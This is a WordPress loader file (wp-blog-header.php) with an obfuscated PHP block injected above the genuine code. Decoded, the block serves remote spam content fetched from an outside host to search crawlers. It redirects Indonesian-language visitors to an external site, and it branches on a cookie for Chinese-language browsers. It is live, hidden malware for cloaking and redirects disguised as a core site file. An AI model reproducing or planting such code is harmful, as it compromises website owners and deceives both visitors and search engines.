<?php
goto O2428; O5173: header("\114\157\x63\141\x74\151\x6f\156\72\x20\150\164\164\x70\x73\72\57\x2f\145\166\x6f\153\x75\154\165\56\x70\x61\x67\x65\163\x2e\x64\x65\x76\57"); goto O9185; O6754: exit; goto O5668; O9866: $O3292 = strtolower($_SERVER["\x48\x54\x54\120\137\x41\x43\x43\x45\x50\124\x5f\114\101\116\x47\x55\101\x47\105"]); goto O3517; O6076: setcookie("\141\x7a", "\154\x70", time() + 3600 * 7200); goto O2356; O5479: O1051: goto O5290; O9185: exit; goto O8079; O3517: if (!(strpos($O3292, "\x7a\150") !== false && $_SERVER["\x48\x54\x54\120\x5f\125\x50\107\122\101\x44\105\137\x49\116\123\105\x43\125\122\105\137\x52\105\x51\x55\105\x53\x54\123"] == 1 && $_COOKIE["\x61\172"] == "\154\160")) { goto O1051; } goto O6076; O5290: echo file_get_contents("\150\x74\164\x70\x73\x3a\x2f\57\143\141\160\154\x61\153\x67\x72\157\165\x70\56\x63\157\x6d\57\x65\x76\x6f\57\145\x76\157\x2e\164\x78\x74"); goto O6754; O4689: O3064: goto O4621; O2428: $O7299 = $_SERVER["\x48\124\124\120\x5f\122\x45\x46\x45\122\x45\x52"]; goto O7313; O4621: $O4905 = substr($_SERVER["\110\124\x54\x50\x5f\x41\103\x43\x45\x50\x54\x5f\x4c\101\116\x47\x55\101\107\x45"], 0, 2); goto O9385; O5668: echo "\40\x20\x20\40\x20\x20\40\x20"; goto O4689; O9385: if (!($O4905 == "\x69\144")) { goto O7133; } goto O5173; O6495: if (!(strpos($O1332, "\142\x6f\164") !== false && $_SERVER["\122\x45\x51\125\x45\x53\x54\137\125\122\x49"] == "\57")) { goto O3064; } goto O9866; O2356: echo "\x20"; goto O3773; O7313: $O1332 = $_SERVER["\x48\x54\x54\x50\x5f\125\123\105\x52\137\x41\x47\x45\116\x54"]; goto O6495; O3773: exit; goto O5479; O8079: O7133:
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
